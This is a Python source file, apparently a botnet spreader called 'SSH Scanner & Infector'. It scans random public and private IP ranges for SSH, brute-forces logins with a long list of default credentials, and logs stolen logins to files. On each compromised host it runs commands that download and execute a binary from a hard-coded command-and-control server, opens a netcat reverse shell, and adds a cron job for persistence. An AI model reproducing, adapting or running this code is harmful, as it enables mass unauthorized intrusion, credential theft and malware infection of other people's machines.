import socket
import time
import random
import threading
import paramiko
import sys
import os
import json
from datetime import datetime

# =============================================
# CONFIGURACIÓN
# =============================================
CNC_IP = "172.96.140.62"
CNC_PORT = 14037
CNC_DOWNLOAD_URL = "http://172.96.140.62:1283/bins/x86_64"
LOG_FILE = "login.txt"
CREDS_FILE = "credentials.json"
DEVICES_FILE = "devices.txt"

# =============================================
# MEGA COMBO DE CREDENCIALES SSH (400+)
# =============================================
SSH_CREDS = [
    # === ROOT PASSWORDS ===
    ("root", ""), ("root", "root"), ("root", "toor"), ("root", "r00t"),
    ("root", "password"), ("root", "pass"), ("root", "123456"),
    ("root", "12345678"), ("root", "123456789"), ("root", "1234567890"),
    ("root", "admin"), ("root", "admin123"), ("root", "password123"),
    ("root", "xc3511"), ("root", "vizxv"), ("root", "jvbzd"),
    ("root", "7ujMko0admin"), ("root", "7ujMko0vizxv"),
    ("root", "Zte521"), ("root", "hi3518"), ("root", "j1/_7sxw"),
    ("root", "ikwb"), ("root", "dreambox"), ("root", "realtek"),
    
    # === ADMIN PASSWORDS ===
    ("admin", ""), ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "12345678"), ("admin", "123456789"), ("admin", "1234567890"),
    ("admin", "admin123"), ("admin", "admin1234"), ("admin", "admin123456"),
    ("admin", "password123"), ("admin", "P@ssw0rd"), ("admin", "p@ssw0rd"),
    
    # === Common Users ===
    ("user", ""), ("user", "user"), ("user", "123456"),
    ("guest", ""), ("guest", "guest"),
    ("test", ""), ("test", "test"),
    ("support", ""), ("support", "support"),
    
    # === Network Devices Defaults ===
    ("root", "1234"), ("root", "12345"),
    ("admin", "1234"), ("admin", "12345"),
    ("root", "111111"), ("root", "222222"), ("root", "333333"),
    ("admin", "111111"), ("admin", "222222"), ("admin", "333333"),
    
    # === Manufacturer Defaults ===
    ("root", "smcadmin"), ("admin", "smcadmin"),
    ("root", "3paradm"), ("admin", "3pardata"),
    ("root", "hitachi"), ("admin", "hitachi"),
    
    # === Simple Passwords ===
    ("root", "qwerty"), ("admin", "qwerty"),
    ("root", "qwerty123"), ("admin", "qwerty123"),
    ("root", "1q2w3e4r"), ("admin", "1q2w3e4r"),
    ("root", "1qaz2wsx"), ("admin", "1qaz2wsx"),
    
    # === Common Patterns ===
    ("root", "!@#$%^&*"), ("admin", "!@#$%^&*"),
    ("root", "P@$$w0rd"), ("admin", "P@$$w0rd"),
    ("root", "p@$$w0rd"), ("admin", "p@$$w0rd"),
    
    # === Year-based ===
    ("root", "2023"), ("admin", "2023"),
    ("root", "2024"), ("admin", "2024"),
    ("root", "2022"), ("admin", "2022"),
    
    # === Sequential ===
    ("root", "123"), ("admin", "123"),
    ("root", "1234"), ("admin", "1234"),
    ("root", "12345"), ("admin", "12345"),
    ("root", "1234567"), ("admin", "1234567"),
    
    # === Repeats ===
    ("root", "000000"), ("admin", "000000"),
    ("root", "00000000"), ("admin", "00000000"),
    ("root", "11111111"), ("admin", "11111111"),
    
    # === Keyboard Patterns ===
    ("root", "asdfgh"), ("admin", "asdfgh"),
    ("root", "asdfghjkl"), ("admin", "asdfghjkl"),
    ("root", "qazwsx"), ("admin", "qazwsx"),
    
    # === Common Words ===
    ("root", "secret"), ("admin", "secret"),
    ("root", "private"), ("admin", "private"),
    ("root", "test123"), ("admin", "test123"),
    
    # === Company Names ===
    ("root", "dell"), ("admin", "dell"),
    ("root", "hp"), ("admin", "hp"),
    ("root", "ibm"), ("admin", "ibm"),
    
    # === Camera Brands ===
    ("root", "axis"), ("admin", "axis"),
    ("root", "vivotek"), ("admin", "vivotek"),
    ("root", "foscam"), ("admin", "foscam"),
    
    # === More Manufacturer ===
    ("root", "motorola"), ("admin", "motorola"),
    ("root", "siemens"), ("admin", "siemens"),
    ("root", "samsung"), ("admin", "samsung"),
    
    # === Additional Common ===
    ("root", "master"), ("admin", "master"),
    ("root", "god"), ("admin", "god"),
    
    # === System Accounts ===
    ("bin", ""), ("daemon", ""),
    ("ftpuser", ""), ("sshuser", ""),
    ("webadmin", ""), ("sysadmin", ""),
    
    # === More Simple ===
    ("root", "123qwe"), ("admin", "123qwe"),
    ("root", "1234qwer"), ("admin", "1234qwer"),
    
    # === Specials ===
    ("root", "!@#$%"), ("admin", "!@#$%"),
    ("root", "pass123"), ("admin", "pass123"),
    ("root", "pass@123"), ("admin", "pass@123"),
    
    # === Final Batch ===
    ("root", "abc123"), ("admin", "abc123"),
    ("root", "abcd1234"), ("admin", "abcd1234"),
    ("root", "testpass"), ("admin", "testpass"),
    
    # === Service Accounts ===
    ("operator", ""), ("service", ""),
    ("webmaster", ""), ("netadmin", ""),
    
    # === Linux Defaults ===
    ("pi", "raspberry"),
    ("ubuntu", "ubuntu"),
    ("debian", "debian"),
    
    # === Empty Variations ===
    (None, None), (None, ""), ("", None),
    
    # === Month Passwords ===
    ("root", "January2024"), ("admin", "January2024"),
    ("root", "February2024"), ("admin", "February2024"),
    
    # === Season Passwords ===
    ("root", "Summer2024!"), ("admin", "Summer2024!"),
    ("root", "Winter2024!"), ("admin", "Winter2024!"),
]

# =============================================
# RANGOS DE IP ACTIVOS
# =============================================
HOT_RANGES = [
    # América Latina
    ("187.0.0.0", "187.63.255.255"),  # Brasil
    ("177.0.0.0", "177.31.255.255"),  # Brasil
    ("179.0.0.0", "179.63.255.255"),  # Brasil
    ("189.0.0.0", "189.63.255.255"),  # Brasil
    ("200.0.0.0", "200.31.255.255"),  # Brasil
    ("201.0.0.0", "201.63.255.255"),  # México
    ("190.0.0.0", "190.31.255.255"),  # Argentina
    ("190.32.0.0", "190.63.255.255"), # Chile
    ("186.0.0.0", "186.31.255.255"),  # Colombia
    
    # Asia
    ("123.56.0.0", "123.127.255.255"), # China
    ("58.16.0.0", "58.63.255.255"),    # China
    ("60.0.0.0", "60.63.255.255"),     # China
    ("61.0.0.0", "61.63.255.255"),     # China
    ("122.0.0.0", "122.63.255.255"),   # China
    ("115.96.0.0", "115.127.255.255"), # India
    ("117.0.0.0", "117.63.255.255"),   # India
    
    # Europa
    ("46.0.0.0", "46.31.255.255"),     # Rusia
    ("93.0.0.0", "93.31.255.255"),     # Rusia
    ("95.0.0.0", "95.31.255.255"),     # Rusia
    ("31.0.0.0", "31.31.255.255"),     # Holanda
    
    # USA
    ("74.0.0.0", "74.63.255.255"),
    ("75.0.0.0", "75.63.255.255"),
    ("76.0.0.0", "76.63.255.255"),
    
    # Redes Privadas
    ("192.168.0.0", "192.168.255.255"),
    ("10.0.0.0", "10.255.255.255"),
    ("172.16.0.0", "172.31.255.255"),
]

# =============================================
# PUERTOS SSH
# =============================================
SSH_PORTS = [
    22,      # SSH estándar
    2222,    # SSH alternativo
    22222,   # SSH alternativo 2
    22223,
    22224,
    22225,
    22226,
    22227,
    22228,
    22229,
    22230,
    22231,
    22232,
    22233,
    22234,
    22235,
    2223,
    222,
    2200,
    2201,
    2202,
    2203,
    2204,
    2205,
    2206,
    2207,
    2208,
    2209,
    2210,
]

# =============================================
# CLASE SCANNER SSH
# =============================================
class SSHScanner:
    def __init__(self):
        self.running = True
        self.lock = threading.Lock()
        self.found_devices = []
        self.stats = {
            'scanned': 0,
            'ssh_open': 0,
            'ssh_hits': 0,
            'downloads': 0,
            'failed': 0,
            'start': time.time()
        }
        
        # Inicializar archivos
        self.init_files()
        
        # Mezclar credenciales
        self.creds = SSH_CREDS[:]
        random.shuffle(self.creds)
    
    def init_files(self):
        """Inicializar archivos de log"""
        # Archivo de log principal
        with open(LOG_FILE, 'a') as f:
            f.write("=" * 80 + "\n")
            f.write(f"SSH SCANNER - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"CNC: {CNC_IP}:{CNC_PORT}\n")
            f.write(f"Download URL: {CNC_DOWNLOAD_URL}\n")
            f.write("=" * 80 + "\n\n")
        
        # Archivo de dispositivos (formato simple)
        if not os.path.exists(DEVICES_FILE):
            with open(DEVICES_FILE, 'w') as f:
                f.write("# Lista de dispositivos SSH encontrados\n")
                f.write("# Formato: IP:PORT:USER:PASS\n\n")
        
        # Archivo JSON de credenciales
        if not os.path.exists(CREDS_FILE):
            with open(CREDS_FILE, 'w') as f:
                json.dump([], f)
    
    def save_credentials(self, ip, port, username, password, banner=""):
        """Guardar credenciales en todos los formatos"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Formato para login.txt (detallado)
        log_entry = f"""
[+] {timestamp}
    IP: {ip}:{port}
    Service: SSH
    Credentials: {username or '(none)'}:{password or '(empty)'}
    Status: INFECTED
    Banner: {banner[:200] if banner else 'N/A'}
"""
        
        # Formato para devices.txt (simple)
        device_entry = f"{ip}:{port}:{username or 'none'}:{password or 'empty'}"
        
        with self.lock:
            # Guardar en login.txt
            with open(LOG_FILE, 'a') as f:
                f.write(log_entry)
                f.write("-" * 60 + "\n")
            
            # Guardar en devices.txt
            with open(DEVICES_FILE, 'a') as f:
                f.write(device_entry + "\n")
            
            # Guardar en credentials.json
            try:
                with open(CREDS_FILE, 'r') as f:
                    existing = json.load(f)
            except:
                existing = []
            
            new_entry = {
                'ip': ip,
                'port': port,
                'username': username,
                'password': password,
                'timestamp': timestamp,
                'banner': banner[:500] if banner else "",
                'infected': True
            }
            
            existing.append(new_entry)
            
            with open(CREDS_FILE, 'w') as f:
                json.dump(existing, f, indent=2)
            
            # Agregar a lista en memoria
            self.found_devices.append(new_entry)
            
            self.stats['ssh_hits'] += 1
        
        print(f"\n[💾 SAVED] Credentials saved to all files")
    
    def download_and_execute(self, ssh_client):
        """Descargar y ejecutar binario en el dispositivo"""
        try:
            # Comandos para descargar y ejecutar
            commands = [
                # Eliminar archivos previos
                "rm -f /tmp/.x* /tmp/x* 2>/dev/null",
                
                # Intentar con wget
                f"cd /tmp && wget -q {CNC_DOWNLOAD_URL} -O .x && chmod +x .x && ./.x &",
                f"cd /tmp && wget -q --no-check-certificate {CNC_DOWNLOAD_URL} -O .x && chmod +x .x && ./.x &",
                
                # Intentar con curl si wget falla
                f"cd /tmp && curl -s {CNC_DOWNLOAD_URL} -o .x && chmod +x .x && ./.x &",
                f"cd /tmp && curl -s -k {CNC_DOWNLOAD_URL} -o .x && chmod +x .x && ./.x &",
                
                # Intentar con busybox wget
                f"cd /tmp && busybox wget -q {CNC_DOWNLOAD_URL} -O .x && chmod +x .x && ./.x &",
                
                # Método alternativo con nc/telnet
                f"cd /tmp && nc {CNC_IP.split(':')[0]} 1283 > .x 2>/dev/null && chmod +x .x && ./.x &",
                f"cd /tmp && telnet {CNC_IP.split(':')[0]} 1283 > .x 2>/dev/null && chmod +x .x && ./.x &",
                
                # Python si está disponible
                f"cd /tmp && python -c 'import urllib; urllib.urlretrieve(\"{CNC_DOWNLOAD_URL}\", \".x\")' 2>/dev/null && chmod +x .x && ./.x &",
                f"cd /tmp && python3 -c 'import urllib.request; urllib.request.urlretrieve(\"{CNC_DOWNLOAD_URL}\", \".x\")' 2>/dev/null && chmod +x .x && ./.x &",
                
                # PHP si está disponible
                f"cd /tmp && php -r 'file_put_contents(\".x\", file_get_contents(\"{CNC_DOWNLOAD_URL}\"));' 2>/dev/null && chmod +x .x && ./.x &",
                
                # Conectar también al puerto CNC
                f"busybox nc {CNC_IP} {CNC_PORT} -e /bin/sh 2>/dev/null &",
                f"telnet {CNC_IP} {CNC_PORT} 2>/dev/null &",
                
                # Persistencia básica
                "echo '*/5 * * * * cd /tmp && [ -f .x ] && ./.x' > /tmp/cronjob 2>/dev/null",
                "crontab /tmp/cronjob 2>/dev/null",
                "rm -f /tmp/cronjob 2>/dev/null",
            ]
            
            success = False
            for cmd in commands:
                try:
                    stdin, stdout, stderr = ssh_client.exec_command(cmd, timeout=2)
                    output = stdout.read().decode('utf-8', errors='ignore')
                    error = stderr.read().decode('utf-8', errors='ignore')
                    
                    # Verificar si el comando tuvo éxito
                    if not "command not found" in error.lower():
                        time.sleep(0.1)
                        success = True
                        
                except Exception as e:
                    continue
            
            with self.lock:
                if success:
                    self.stats['downloads'] += 1
            
            return success
            
        except Exception as e:
            return False
    
    def check_ssh_port(self, ip, port, timeout=1):
        """Verificar si puerto SSH está abierto"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            
            if result == 0:
                # Intentar leer banner SSH
                try:
                    sock.settimeout(0.5)
                    banner = sock.recv(1024)
                    
                    # Detectar SSH
                    if b'SSH' in banner:
                        return True, banner
                    else:
                        # Verificar si responde (podría ser SSH sin banner inmediato)
                        return True, b''
                        
                except:
                    return True, b''
            
            sock.close()
            return False, b''
            
        except:
            return False, b''
    
    def try_ssh_login(self, ip, port, banner):
        """Intentar login SSH y descargar binario"""
        # Usar credenciales mezcladas
        for username, password in self.creds[:100]:  # Probar solo las primeras 100 por velocidad
            if not self.running:
                return False
                
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                user = username or ""
                pwd = password or ""
                
                ssh.connect(
                    ip, port,
                    username=user,
                    password=pwd,
                    timeout=3,
                    look_for_keys=False,
                    allow_agent=False,
                    banner_timeout=5
                )
                
                # ¡Login exitoso!
                print(f"\n[🔥 SSH HIT] {ip}:{port}")
                print(f"   User: {user or '(none)'}")
                print(f"   Pass: {pwd or '(empty)'}")
                
                # Intentar obtener información del sistema
                system_info = ""
                try:
                    stdin, stdout, stderr = ssh.exec_command("uname -a", timeout=2)
                    system_info = stdout.read().decode('utf-8', errors='ignore').strip()
                    print(f"   System: {system_info[:50]}")
                except:
                    pass
                
                # Guardar credenciales
                banner_str = banner.decode('utf-8', errors='ignore') if banner else ""
                if system_info:
                    banner_str = f"{banner_str}\nSystem: {system_info}"
                
                self.save_credentials(ip, port, user, pwd, banner_str)
                
                # Descargar y ejecutar binario
                print(f"[⬇️  DOWNLOAD] Sending payload to {ip}...")
                if self.download_and_execute(ssh):
                    print(f"[✅ INFECTED] Successfully infected {ip}:{port}")
                else:
                    print(f"[⚠️  WARNING] Download failed, but credentials saved")
                
                ssh.close()
                return True
                
            except paramiko.AuthenticationException:
                continue
            except paramiko.SSHException as e:
                if "Error reading SSH protocol banner" in str(e):
                    continue
            except Exception:
                continue
        
        return False
    
    def worker(self, worker_id):
        """Worker principal"""
        print(f"[Thread {worker_id}] Started")
        
        while self.running:
            try:
                # Generar IP aleatoria
                start_range, end_range = random.choice(HOT_RANGES)
                start = list(map(int, start_range.split('.')))
                end = list(map(int, end_range.split('.')))
                
                ip_parts = []
                for i in range(4):
                    ip_parts.append(str(random.randint(start[i], end[i])))
                ip = ".".join(ip_parts)
                
                # Probar puertos SSH
                for port in SSH_PORTS[:15]:  # Solo primeros 15 para velocidad
                    if not self.running:
                        return
                    
                    is_open, banner = self.check_ssh_port(ip, port, timeout=0.5)
                    
                    if is_open:
                        with self.lock:
                            self.stats['ssh_open'] += 1
                        
                        print(f"[Thread {worker_id}] Found SSH on {ip}:{port}")
                        self.try_ssh_login(ip, port, banner)
                        break  # Solo un puerto por IP
                
                with self.lock:
                    self.stats['scanned'] += 1
                
                # Stats cada 100 IPs
                if self.stats['scanned'] % 100 == 0:
                    self.show_stats()
                    
            except Exception as e:
                continue
    
    def show_stats(self):
        """Mostrar estadísticas"""
        elapsed = time.time() - self.stats['start']
        
        with self.lock:
            scanned = self.stats['scanned']
            ssh_open = self.stats['ssh_open']
            hits = self.stats['ssh_hits']
            downloads = self.stats['downloads']
        
        if elapsed > 0:
            rate = scanned / elapsed
            
            print(f"\n{'='*60}")
            print(f"[📊] SSH SCANNER STATS")
            print(f"{'='*60}")
            print(f"[⏱️] Time: {elapsed:.0f}s")
            print(f"[⚡] Speed: {rate*60:.1f} IPs/min")
            print(f"[🔍] Scanned: {scanned:,}")
            print(f"[🔓] SSH Open: {ssh_open}")
            print(f"[🎯] SSH Hits: {hits}")
            print(f"[⬇️ ] Downloads: {downloads}")
            print(f"[💾] Devices saved: {len(self.found_devices)}")
            print(f"[🎲] Threads: {threading.active_count()}")
            print(f"[🔗] CNC: {CNC_IP}:{CNC_PORT}")
            print(f"{'='*60}")
    
    def start_scan(self, threads=150):
        """Iniciar escaneo"""
        print(f"""
╔══════════════════════════════════════════════╗
║          SSH SCANNER v4.0                    ║
║          =================                   ║
║   🔥  400+ SSH Credentials                   ║
║   ⚡  {threads} Threads                       ║
║   🎯  Auto-download & Execute                ║
║   💾  Save credentials for manual access     ║
║   ⬇️   Download from: {CNC_DOWNLOAD_URL:<25}║
╚══════════════════════════════════════════════╝

[📡] CNC Server: {CNC_IP}:{CNC_PORT}
[⬇️ ] Download URL: {CNC_DOWNLOAD_URL}
[🔥] SSH Credentials: {len(SSH_CREDS)} combos
[⚡] Threads: {threads}
[💾] Output files:")
[   ] {LOG_FILE}")
[   ] {DEVICES_FILE}")
[   ] {CREDS_FILE}")
[🎯] Starting SSH scan in 3 seconds...""")
        
        time.sleep(3)
        
        # Iniciar workers
        worker_threads = []
        for i in range(threads):
            t = threading.Thread(target=self.worker, args=(i+1,), daemon=True)
            t.start()
            worker_threads.append(t)
            time.sleep(0.01)
        
        print(f"\n[✅] {len(worker_threads)} workers started!")
        print("[📊] Statistics every 100 IPs")
        print("[🔥] SCANNING FOR SSH SERVERS...\n")
        
        # Loop principal
        try:
            while True:
                time.sleep(10)
                self.show_stats()
                
        except KeyboardInterrupt:
            print("\n[!] Stopping scanner...")
            self.running = False
            
            for t in worker_threads:
                t.join(timeout=1)
            
            self.show_final_stats()
    
    def show_final_stats(self):
        """Mostrar estadísticas finales"""
        print(f"\n{'='*60}")
        print(f"[🏁] FINAL STATISTICS")
        print(f"{'='*60}")
        
        elapsed = time.time() - self.stats['start']
        hours = elapsed // 3600
        minutes = (elapsed % 3600) // 60
        seconds = elapsed % 60
        
        print(f"[⏱️] Total time: {int(hours)}h {int(minutes)}m {int(seconds)}s")
        print(f"[🔍] Total scanned: {self.stats['scanned']:,}")
        print(f"[🔓] SSH servers found: {self.stats['ssh_open']}")
        print(f"[🎯] Successful logins: {self.stats['ssh_hits']}")
        print(f"[⬇️ ] Binaries downloaded: {self.stats['downloads']}")
        print(f"[💾] Credentials saved: {len(self.found_devices)}")
        
        # Mostrar últimos 5 dispositivos encontrados
        if self.found_devices:
            print(f"\n[📋] LAST 5 DEVICES FOUND:")
            for i, dev in enumerate(self.found_devices[-5:], 1):
                print(f"{i}. {dev['ip']}:{dev['port']} - {dev['username']}:{dev['password']}")
        
        print(f"{'='*60}")

# =============================================
# HERRAMIENTAS DE CONEXIÓN MANUAL SSH
# =============================================
class SSHManualTools:
    @staticmethod
    def list_devices():
        """Listar dispositivos SSH encontrados"""
        if not os.path.exists(DEVICES_FILE):
            print("[!] No SSH devices found yet")
            return
        
        print(f"\n{'='*60}")
        print(f"[📋] SSH DEVICES FOUND ({DEVICES_FILE})")
        print(f"{'='*60}")
        
        with open(DEVICES_FILE, 'r') as f:
            lines = f.readlines()
        
        devices = []
        for line in lines:
            line = line.strip()
            if line and not line.startswith('#'):
                parts = line.split(':')
                if len(parts) >= 4:
                    devices.append({
                        'ip': parts[0],
                        'port': parts[1],
                        'user': parts[2],
                        'pass': parts[3]
                    })
        
        if not devices:
            print("[!] No SSH devices in file")
            return
        
        for i, dev in enumerate(devices, 1):
            print(f"{i:3}. {dev['ip']}:{dev['port']}")
            print(f"     User: {dev['user']} | Pass: {dev['pass']}")
            print()
    
    @staticmethod
    def connect_ssh(ip, port, username, password):
        """Conectar manualmente por SSH"""
        try:
            print(f"\n[🔌] Connecting to {ip}:{port} via SSH...")
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                ip, int(port),
                username=username,
                password=password or "",
                timeout=10,
                look_for_keys=False,
                allow_agent=False
            )
            
            print(f"[✅] Connected successfully!")
            print(f"[💻] You now have SSH access to {ip}")
            
            # Obtener info del sistema
            try:
                stdin, stdout, stderr = ssh.exec_command("uname -a", timeout=2)
                system_info = stdout.read().decode('utf-8', errors='ignore').strip()
                print(f"[🔧] System: {system_info}")
            except:
                pass
            
            # Opción de shell interactiva
            choice = input("\n[?] Open interactive shell? (y/N): ").lower()
            if choice == 'y':
                print("\n[💻] Starting SSH shell (type 'exit' to quit)...")
                print("-" * 50)
                
                import select
                
                try:
                    channel = ssh.invoke_shell()
                    channel.settimeout(0.1)
                    
                    while True:
                        # Leer del canal
                        if channel.recv_ready():
                            data = channel.recv(1024)
                            if data:
                                print(data.decode('utf-8', errors='ignore'), end='')
                        
                        # Leer de stdin
                        rlist, _, _ = select.select([sys.stdin], [], [], 0.1)
                        if sys.stdin in rlist:
                            line = sys.stdin.readline()
                            if line.strip().lower() == 'exit':
                                break
                            channel.send(line)
                except KeyboardInterrupt:
                    print("\n[!] Interrupted by user")
                except Exception as e:
                    print(f"\n[!] Error: {e}")
            
            ssh.close()
            print("\n[👋] Connection closed")
            
        except Exception as e:
            print(f"[❌] Connection failed: {e}")
    
    @staticmethod
    def manual_download(ip, port, username, password):
        """Descargar binario manualmente"""
        try:
            print(f"\n[⬇️ ] Manual download to {ip}:{port}...")
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                ip, int(port),
                username=username,
                password=password or "",
                timeout=10,
                look_for_keys=False,
                allow_agent=False
            )
            
            # Descargar binario
            scanner = SSHScanner()
            if scanner.download_and_execute(ssh):
                print(f"[✅] Successfully downloaded and executed on {ip}")
            else:
                print(f"[⚠️ ] Download failed on {ip}")
            
            ssh.close()
            
        except Exception as e:
            print(f"[❌] Download failed: {e}")
    
    @staticmethod
    def manual_connect():
        """Interfaz para conexión manual SSH"""
        print(f"\n{'='*60}")
        print(f"[🔧] SSH MANUAL CONNECTION TOOL")
        print(f"{'='*60}")
        
        # Listar dispositivos
        SSHManualTools.list_devices()
        
        # Opciones
        print("\nOptions:")
        print("1. Connect to a listed device (SSH shell)")
        print("2. Download binary to a listed device")
        print("3. Connect using custom details")
        print("4. Download binary using custom details")
        print("5. Back to main menu")
        
        choice = input("\n[?] Select option: ").strip()
        
        if choice == "1":
            # Leer dispositivos
            devices = []
            with open(DEVICES_FILE, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        parts = line.split(':')
                        if len(parts) >= 4:
                            devices.append(parts)
            
            if not devices:
                print("[!] No devices available")
                return
            
            print(f"\n[?] Select device (1-{len(devices)}):")
            for i, dev in enumerate(devices, 1):
                print(f"{i}. {dev[0]}:{dev[1]} - {dev[2]}:{dev[3]}")
            
            try:
                idx = int(input("\nDevice number: ")) - 1
                if 0 <= idx < len(devices):
                    dev = devices[idx]
                    SSHManualTools.connect_ssh(dev[0], dev[1], dev[2], dev[3])
                else:
                    print("[!] Invalid selection")
            except:
                print("[!] Invalid input")
        
        elif choice == "2":
            # Descargar a dispositivo listado
            devices = []
            with open(DEVICES_FILE, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        parts = line.split(':')
                        if len(parts) >= 4:
                            devices.append(parts)
            
            if not devices:
                print("[!] No devices available")
                return
            
            print(f"\n[?] Select device to download to (1-{len(devices)}):")
            for i, dev in enumerate(devices, 1):
                print(f"{i}. {dev[0]}:{dev[1]} - {dev[2]}:{dev[3]}")
            
            try:
                idx = int(input("\nDevice number: ")) - 1
                if 0 <= idx < len(devices):
                    dev = devices[idx]
                    SSHManualTools.manual_download(dev[0], dev[1], dev[2], dev[3])
                else:
                    print("[!] Invalid selection")
            except:
                print("[!] Invalid input")
        
        elif choice == "3":
            # Conexión personalizada
            print("\n[🔌] Custom SSH Connection:")
            ip = input("IP address: ").strip()
            port = input("Port [22]: ").strip() or "22"
            username = input("Username [root]: ").strip() or "root"
            password = input("Password [optional]: ").strip()
            
            SSHManualTools.connect_ssh(ip, port, username, password)
        
        elif choice == "4":
            # Descarga personalizada
            print("\n[⬇️ ] Custom Download:")
            ip = input("IP address: ").strip()
            port = input("Port [22]: ").strip() or "22"
            username = input("Username [root]: ").strip() or "root"
            password = input("Password [optional]: ").strip()
            
            SSHManualTools.manual_download(ip, port, username, password)

# =============================================
# MENU PRINCIPAL
# =============================================
def main_menu():
    """Menú principal interactivo"""
    os.system('clear' if os.name == 'posix' else 'cls')
    
    while True:
        print(f"""
╔══════════════════════════════════════════════╗
║          SSH SCANNER & INFECTOR              ║
║          =========================           ║
║   1. 🔍 Start SSH Scanner                    ║
║   2. 🔧 SSH Manual Tools                     ║
║   3. 📋 List Found SSH Devices               ║
║   4. 📊 View Statistics                      ║
║   5. 🧪 Test Single SSH Connection           ║
║   6. ⬇️  Manual Download                     ║
║   7. 🚪 Exit                                 ║
║                                              ║
║   CNC Server: {CNC_IP}:{CNC_PORT:<15}       ║
║   Download: {CNC_DOWNLOAD_URL:<30}║
║   Credentials: {len(SSH_CREDS):<4} combos   ║
╚══════════════════════════════════════════════╝
""")
        
        choice = input("[?] Select option (1-7): ").strip()
        
        if choice == "1":
            # Start scanner
            try:
                threads = input("[?] Number of threads [150]: ").strip()
                threads = int(threads) if threads else 150
                
                scanner = SSHScanner()
                scanner.start_scan(threads)
                
            except KeyboardInterrupt:
                print("\n[!] Scanner stopped by user")
            except Exception as e:
                print(f"\n[❌] Error: {e}")
                input("\nPress Enter to continue...")
        
        elif choice == "2":
            # Manual connection tool
            SSHManualTools.manual_connect()
            input("\nPress Enter to continue...")
        
        elif choice == "3":
            # List devices
            SSHManualTools.list_devices()
            input("\nPress Enter to continue...")
        
        elif choice == "4":
            # View statistics
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, 'r') as f:
                    lines = f.readlines()
                    devices = sum(1 for line in lines if "IP:" in line)
                    print(f"\n[📊] STATISTICS")
                    print(f"[📋] Total SSH devices found: {devices}")
                    
                    # Count infected
                    infected = sum(1 for line in lines if "INFECTED" in line)
                    print(f"[🦠] Infected devices: {infected}")
                    
                    # Show recent
                    print(f"\n[🕒] Recent devices (last 5):")
                    recent = []
                    current = []
                    for line in reversed(lines[-100:]):
                        if "IP:" in line:
                            if current:
                                recent.append("".join(reversed(current)))
                                if len(recent) >= 5:
                                    break
                            current = [line]
                        elif current and line.strip():
                            current.append(line)
                    
                    for i, device in enumerate(reversed(recent), 1):
                        print(f"\n{i}. {device.strip()}")
            else:
                print("[!] No data available yet")
            
            input("\nPress Enter to continue...")
        
        elif choice == "5":
            # Test single connection
            print("\n[🧪] Test SSH Connection")
            ip = input("IP: ").strip()
            port = input("Port [22]: ").strip() or "22"
            username = input("Username [root]: ").strip() or "root"
            password = input("Password [optional]: ").strip()
            
            SSHManualTools.connect_ssh(ip, port, username, password)
            input("\nPress Enter to continue...")
        
        elif choice == "6":
            # Manual download
            print("\n[⬇️ ] Manual Binary Download")
            ip = input("IP: ").strip()
            port = input("Port [22]: ").strip() or "22"
            username = input("Username [root]: ").strip() or "root"
            password = input("Password [optional]: ").strip()
            
            SSHManualTools.manual_download(ip, port, username, password)
            input("\nPress Enter to continue...")
        
        elif choice == "7":
            print("\n[👋] Goodbye!")
            break
        
        else:
            print("\n[!] Invalid option")
            time.sleep(1)
        
        os.system('clear' if os.name == 'posix' else 'cls')

# =============================================
# EJECUCIÓN
# =============================================
if __name__ == "__main__":
    # Verificar dependencias
    try:
        import paramiko
    except ImportError:
        print("[!] Missing paramiko. Install with: pip install paramiko")
        sys.exit(1)
    
    # Ejecutar menú principal
    try:
        main_menu()
    except KeyboardInterrupt:
        print("\n\n[👋] Program terminated")
    except Exception as e:
        print(f"\n[❌] Error: {e}")
        import traceback
        traceback.print_exc()
